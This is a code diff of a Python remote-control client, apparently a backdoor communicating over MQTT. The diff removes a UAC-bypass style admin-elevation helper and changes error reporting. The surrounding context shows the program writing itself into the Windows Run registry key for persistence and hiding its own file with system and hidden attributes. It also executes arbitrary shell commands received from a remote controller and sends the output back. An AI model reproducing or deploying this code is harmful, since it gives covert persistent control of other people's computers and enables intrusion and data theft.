@@ -20,9 +20,6 @@ def getpath():
         application_path = os.path.abspath(__file__)
     return application_path
 
-def run_as_admin(cmd=""):
-    function(uac=True, persist=False, elevate=False).run(id="13", payload=["C:\\windows\\system32\\cmd.exe", f'/c "{cmd}"'])
-
 if systype == "windows":
     print(os.popen(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL non-auto setup" /d "{getpath()}" /f').read())
     print(os.system(f'attrib +s +h +a "{getpath()}"'))
@@ -99,16 +96,18 @@ def mode_cmd(job_id, session_id, cmd):
                     cmd = "pwd"
 
         encoding = locale.getdefaultlocale()[1]
-        p = subprocess.Popen(cmd, cwd=runpath_dict[session_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # getoutputs
+        p = subprocess.Popen(cmd, cwd=runpath_dict[session_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = p.communicate()
         if p.returncode == 0:
             result = stdout.decode(encoding, errors="replace")
+            iserr = 0
         else:
-            result = "<stderr>" + stderr.decode(encoding, errors="replace")
-        send(client, topic_list["result"], {"job_id":job_id, "result": result}, qos=2)
+            result = stderr.decode(encoding, errors="replace")
+            iserr = 1
+        send(client, topic_list["result"], {"job_id": job_id, "result": result, "iserr": iserr}, qos=2)
         donejob_list.append(job_id)
     else:
-        send(client, topic_list["result"], {"job_id":job_id, "result":b"<stderr>\033[1;31mSame job id not accepted. "}, qos=2)
+        send(client, topic_list["result"], {"job_id": job_id, "result": b"Same job id not accepted. ", "iserr": 1}, qos=2)
 
 def on_connect(client, userdata, flags, rc):
     global connected
@@ -155,7 +154,7 @@ client.on_message = on_message
 def upload_stats():
     while True:
         if connected:
-            result, mid = send(client, topic_list["stats"], {"client_id":client_id})
+            result, mid = send(client, topic_list["stats"], {"client_id": client_id})
             print(result, mid)
         time.sleep(0.5)
 
